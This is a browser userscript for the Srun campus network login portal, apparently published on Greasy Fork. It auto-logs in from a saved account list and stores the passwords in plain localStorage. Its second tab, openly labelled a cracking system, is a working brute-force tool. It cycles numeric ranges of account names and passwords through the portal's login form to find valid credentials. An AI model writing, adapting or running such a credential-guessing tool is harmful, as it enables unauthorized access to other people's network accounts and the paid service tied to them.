// ==UserScript==
// @name         🔥深澜校园网｜自动登录｜暴力破解｜窗口｜多账号🔥
// @namespace    https://baidu.com
// @version      10.0.1
// @description  自动登录认证，可通过弹窗输入账号信息，破解账号密码
// @author       十点前睡觉
// @license      MIT
// @include      http*://*/srun_portal_pc*
// @include      https://connect.rom.miui.com/*  
// @downloadURL https://update.greasyfork.org/scripts/483810/%F0%9F%94%A5%E6%B7%B1%E6%BE%9C%E6%A0%A1%E5%9B%AD%E7%BD%91%EF%BD%9C%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95%EF%BD%9C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BD%9C%E7%AA%97%E5%8F%A3%EF%BD%9C%E5%A4%9A%E8%B4%A6%E5%8F%B7%F0%9F%94%A5.user.js
// @updateURL https://update.greasyfork.org/scripts/483810/%F0%9F%94%A5%E6%B7%B1%E6%BE%9C%E6%A0%A1%E5%9B%AD%E7%BD%91%EF%BD%9C%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95%EF%BD%9C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BD%9C%E7%AA%97%E5%8F%A3%EF%BD%9C%E5%A4%9A%E8%B4%A6%E5%8F%B7%F0%9F%94%A5.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // 定义常量和变量
    const accountStorageKey = 'accounts';
    const autoLoginKey = 'autoLoginEnabled'; // 自动登录开关的状态存储键名

    // 从localStorage读取自动登录开关的状态，如果不存在，默认为true
    let autoLoginEnabled = JSON.parse(localStorage.getItem(autoLoginKey)) || false;
    var accounts = JSON.parse(localStorage.getItem(accountStorageKey) || '[]');
    var currentAccountIndex = 0;

    // 创建主容器
    var mainContainer = document.createElement('div');
    mainContainer.style.position = 'fixed';
    mainContainer.style.top = '50%';
    mainContainer.style.left = '50%';
    mainContainer.style.transform = 'translate(-50%, -50%)';
    mainContainer.style.zIndex = '9999';
    mainContainer.style.backgroundColor = 'white';
    mainContainer.style.padding = '10px';
    mainContainer.style.border = '1px solid #ccc';
    mainContainer.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.1)';
    mainContainer.style.borderRadius = '8px';

    // 创建按钮容器
    var buttonContainer = document.createElement('div');
    buttonContainer.style.textAlign = 'center';

    // 创建标签页按钮
    var tab1Button = document.createElement('button');
    tab1Button.id = 'tab1Button';
    tab1Button.textContent = '登录系统';
    tab1Button.style.display = 'inline-block';
    tab1Button.style.margin = '5px';
    tab1Button.style.padding = '5px 15px';
    tab1Button.style.backgroundColor = '#0000FF';
    tab1Button.style.color = 'white';
    tab1Button.style.fontWeight = 'bold';
    tab1Button.style.border = 'none';
    tab1Button.style.borderRadius = '4px';
    tab1Button.style.cursor = 'pointer';
    tab1Button.onclick = function() { switchTab('tab1Content'); };

    var tab2Button = document.createElement('button');
    tab2Button.id = 'tab2Button';
    tab2Button.textContent = '破解系统';
    tab2Button.style.display = 'inline-block';
    tab2Button.style.margin = '5px';
    tab2Button.style.padding = '5px 15px';
    tab2Button.style.backgroundColor = '#FF4D4F';
    tab2Button.style.color = 'white';
    tab2Button.style.fontWeight = 'bold';
    tab2Button.style.border = 'none';
    tab2Button.style.borderRadius = '4px';
    tab2Button.style.cursor = 'pointer';
    tab2Button.onclick = function() { switchTab('tab2Content'); };

    // 创建刷新页面按钮
    var refreshPageButton = document.createElement('button');
    refreshPageButton.id = 'refreshPageButton';
    refreshPageButton.textContent = '刷新页面';
    refreshPageButton.style.display = 'inline-block';
    refreshPageButton.style.margin = '5px';
    refreshPageButton.style.padding = '5px 15px';
    refreshPageButton.style.backgroundColor = '#4CAF50';
    refreshPageButton.style.color = 'white';
    refreshPageButton.style.fontWeight = 'bold';
    refreshPageButton.style.border = 'none';
    refreshPageButton.style.borderRadius = '4px';
    refreshPageButton.style.cursor = 'pointer';
    refreshPageButton.onclick = function() {
        location.reload();
    };

    // 创建自动登录开关
    var autoLoginSwitch = document.createElement('input');
    autoLoginSwitch.type = 'checkbox';
    autoLoginSwitch.id = 'autoLoginSwitch';
    autoLoginSwitch.checked = autoLoginEnabled;
    autoLoginSwitch.onchange = function() {
        autoLoginEnabled = this.checked;
        localStorage.setItem(autoLoginKey, autoLoginEnabled);
    };

    var autoLoginLabel = document.createElement('label');
    autoLoginLabel.textContent = '自动登录';
    autoLoginLabel.setAttribute('for', autoLoginSwitch.id);

    // 将自动登录开关和标签添加到按钮容器中
    buttonContainer.appendChild(autoLoginSwitch);
    buttonContainer.appendChild(autoLoginLabel);
    buttonContainer.appendChild(tab1Button);
    buttonContainer.appendChild(tab2Button);
    buttonContainer.appendChild(refreshPageButton);

    // 将按钮容器添加到主容器中
    mainContainer.appendChild(buttonContainer);

    // 创建Tab 1的内容区域
    var tab1Content = document.createElement('div');
    tab1Content.id = 'tab1Content';
    tab1Content.style.display = 'block';
    tab1Content.style.border = '1px solid #ccc';

    tab1Content.innerHTML = `
        <div style="margin-top: 20px; text-align: center; background-color: #f5f5f5; border: 2px solid #dcdcdc; padding: 10px; font-size: 20px; font-weight: bold; color: #333; text-shadow: 1px 1px 2px #aaa;">
            <strong>《登录系统》账号管理说明：</strong>
        </div>
        <div style="text-align: center;">
            <p style="margin: 0; padding: 10px;">
                ①勾选"自动登录"自动顺位登录账号列表<br>
                ②输入账号和密码后点击“添加账号”以保存到账号列表中<br>
                ③删除账号点击账号旁边的“删除”按钮。<br>
                可以添加多个账号自动顺位登录<br>
                会自动跳过已经在线的账号<br>
            </p>
        </div>
    `;

    // 账户管理功能
    var accountList = document.createElement('ul');
    accountList.id = 'accountList';
    tab1Content.appendChild(accountList);

    function updateAccountList() {
        accountList.innerHTML = '';
        accounts.forEach(function(account, index) {
            var li = document.createElement('li');
            li.style.listStyleType = 'none';
            li.style.padding = '5px 0';
            li.textContent = account.user;
            var deleteBtn = document.createElement('button');
            deleteBtn.textContent = '删除';
            deleteBtn.style.margin = '0 5px';
            deleteBtn.style.color = 'red';
            deleteBtn.onclick = function() {
                accounts.splice(index, 1);
                localStorage.setItem(accountStorageKey, JSON.stringify(accounts));
                updateAccountList();
            };
            li.appendChild(deleteBtn);
            accountList.appendChild(li);
        });
    }

    var inputUser = document.createElement('input');
    inputUser.type = 'text';
    inputUser.placeholder = '账号';
    inputUser.style.margin = '5px 0';

    var inputPwd = document.createElement('input');
    inputPwd.type = 'password';
    inputPwd.placeholder = '密码';
    inputPwd.style.margin = '5px 0';

    var addAccountButton = document.createElement('button');
    addAccountButton.textContent = '添加账号';
    addAccountButton.onclick = function() {
        var newUser = inputUser.value.trim();
        var newPwd = inputPwd.value.trim();
        if (newUser && newPwd) {
            accounts.push({user: newUser, pwd: newPwd});
            localStorage.setItem(accountStorageKey, JSON.stringify(accounts));
            updateAccountList();
        } else {
            alert('请输入账号和密码！');
        }
    };

    tab1Content.appendChild(inputUser);
    tab1Content.appendChild(inputPwd);
    tab1Content.appendChild(addAccountButton);

    // 尝试登录数组中的账号
    async function tryLogin(account) {
        if (document.querySelector("#logout") !== null) {
            return;
        }

        document.querySelector("#username").value = account.user;
        document.querySelector("#password").value = account.pwd;
        document.querySelector("#login").click();
        await delay(500);
 
    var msgSelector = ".layui-layer-content";
    var msg = document.querySelector(msgSelector);
    if (msg) {
        var messageText = msg.textContent;
        var confirmBtnSelector = ".layui-layer-btn0";
        var confirmBtn = document.querySelector(confirmBtnSelector);

        if (confirmBtn && (messageText.includes("已经在线了") ||
                           messageText.includes("帐号或密码错误") ||
                           messageText.includes("用户被禁用") ||
                           messageText.includes("用户已欠费") ||
                           messageText.includes("找不到符合条件的产品") ||
                           messageText.includes("用户不存在"))) {
            confirmBtn.click();
            await delay(1000);
            currentAccountIndex++;
            if (currentAccountIndex < accounts.length) {
                tryLogin(accounts[currentAccountIndex]);
            } else {
                console.log("所有账号尝试完毕");
            }
        }
    }
}

// 开始自动登录
async function startAutoLogin() {
    currentAccountIndex = 0;
    if (autoLoginEnabled && accounts.length > 0) {
        tryLogin(accounts[currentAccountIndex]);
    } else {
        console.log("自动登录未开启或账号列表为空");
    }
}

// 监听自动登录开关的变化
autoLoginSwitch.onchange = function() {
    autoLoginEnabled = this.checked;
    localStorage.setItem(autoLoginKey, autoLoginEnabled);
    if (autoLoginEnabled) {
        startAutoLogin();
    }
};

// 将标签页和内容添加到主容器
mainContainer.appendChild(tab1Content);

// 创建Tab 2的内容区域
var tab2Content = document.createElement('div');
tab2Content.id = 'tab2Content';
tab2Content.style.display = 'none';
tab2Content.style.border = '1px solid #ccc';

// 将Tab 2的代码加入到tab2Content中
tab2Content.innerHTML += `
    <div style="margin-top: 20px; text-align: center; background-color: #f5f5f5; border: 2px solid #dcdcdc; padding: 10px; font-size: 20px; font-weight: bold; color: #333; text-shadow: 1px 1px 2px #aaa;">
        <strong>《破解系统》破解说明：</strong>
    </div>
        <div style="text-align: center;">
            <p style="margin: 0; padding: 10px;">
                ①选择破解方式<br>
                ②输入账号密码区间<br>
                ③例如账号和密码相同方式，起始100末尾200 就是100-100 101-101一直到200-200<br>
                <br>
                “我喜欢一块蛋糕，我会去了解它的配方，但如果我只是想尝试它，我完全可以吃第一口”<br>
            </p>
        </div>
`;

// 创建选择框
var modeSelect = document.createElement("select");
modeSelect.id = "modeSelect";
var samePasswordOption = document.createElement("option");
samePasswordOption.value = "samePassword";
samePasswordOption.textContent = "账号和密码相同";
var fixedPasswordOption = document.createElement("option");
fixedPasswordOption.value = "fixedPassword";
fixedPasswordOption.textContent = "固定密码";
var fixedAccountOption = document.createElement("option");
fixedAccountOption.value = "fixedAccount";
fixedAccountOption.textContent = "固定账号";
modeSelect.appendChild(samePasswordOption);
modeSelect.appendChild(fixedPasswordOption);
modeSelect.appendChild(fixedAccountOption);
tab2Content.appendChild(modeSelect);

// 创建账号和密码相同模式的输入框
var startAccountInput = document.createElement("input");
startAccountInput.type = "number";
startAccountInput.placeholder = "起始账号";
tab2Content.appendChild(startAccountInput);

var endAccountInput = document.createElement("input");
endAccountInput.type = "number";
endAccountInput.placeholder = "末尾账号";
tab2Content.appendChild(endAccountInput);

// 创建固定密码模式的输入框
var fixedPasswordInput = document.createElement("input");
fixedPasswordInput.type = "text";
fixedPasswordInput.placeholder = "固定密码";
tab2Content.appendChild(fixedPasswordInput);

// 创建固定账号模式的输入框
var fixedAccountInput = document.createElement("input");
fixedAccountInput.type = "text";
fixedAccountInput.placeholder = "固定账号";
tab2Content.appendChild(fixedAccountInput);

var startPasswordInput = document.createElement("input");
startPasswordInput.type = "number";
startPasswordInput.placeholder = "起始密码";
tab2Content.appendChild(startPasswordInput);

var endPasswordInput = document.createElement("input");
endPasswordInput.type = "number";
endPasswordInput.placeholder = "末尾密码";
tab2Content.appendChild(endPasswordInput);

var button = document.createElement("button");
button.textContent = "启动 脚本";
tab2Content.appendChild(button);

button.onclick = function() {
    startLoginProcess();
};

function showInputsForMode(mode) {
    startAccountInput.style.display = (mode === "samePassword" || mode === "fixedPassword") ? "" : "none";
    endAccountInput.style.display = (mode === "samePassword" || mode === "fixedPassword") ? "" : "none";
    fixedPasswordInput.style.display = (mode === "fixedPassword") ? "" : "none";
    fixedAccountInput.style.display = (mode === "fixedAccount") ? "" : "none";
    startPasswordInput.style.display = (mode === "fixedAccount") ? "" : "none";
    endPasswordInput.style.display = (mode === "fixedAccount") ? "" : "none";
}

modeSelect.onchange = function() {
    showInputsForMode(modeSelect.value);
};

var currentPassword = 0;

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function startLoginProcess() {
    var startAccountNum = parseInt(startAccountInput.value) || 1;
    var endAccountNum = parseInt(endAccountInput.value) || 999;
    var account = "";
    var password = "";

    if (modeSelect.value === "samePassword") {
        for (var i = startAccountNum; i <= endAccountNum; i++) {
            account = i.toString();
            password = account;
            tryLogin({user: account, pwd: password});
            await delay(1000); // 等待一段时间再尝试下一个账号
        }
    } else if (modeSelect.value === "fixedPassword") {
        var fixedPassword = fixedPasswordInput.value || "password";
        for (var i = startAccountNum; i <= endAccountNum; i++) {
            account = i.toString();
            password = fixedPassword;
            tryLogin({user: account, pwd: password});
            await delay(1000); // 等待一段时间再尝试下一个账号
        }
    } else if (modeSelect.value === "fixedAccount") {
        var fixedAccount = fixedAccountInput.value || "account";
        var startPassword = parseInt(startPasswordInput.value) || 200;
        var endPassword = parseInt(endPasswordInput.value) || 300;
        for (currentPassword = startPassword; currentPassword <= endPassword; currentPassword++) {
            password = currentPassword.toString();
            tryLogin({user: fixedAccount, pwd: password});
            await delay(1000); // 等待一段时间再尝试下一个密码
        }
    }

    console.log("脚本执行完毕");
}

// 初始化显示
showInputsForMode(modeSelect.value);

// 将标签页和内容添加到主容器
mainContainer.appendChild(tab2Content);

// 切换标签页内容的函数
function switchTab(contentId) {
    var contents = document.querySelectorAll('div[id^="tab"]');
    contents.forEach(function(content) {
        content.style.display = 'none';
    });
    document.getElementById(contentId).style.display = 'block';
}

// 将主容器添加到页面body
document.body.appendChild(mainContainer);

// 初始化账户列表
updateAccountList();

// 如果自动登录开关被开启，则开始自动登录
if (autoLoginEnabled) {
    startAutoLogin();
}
 
})();
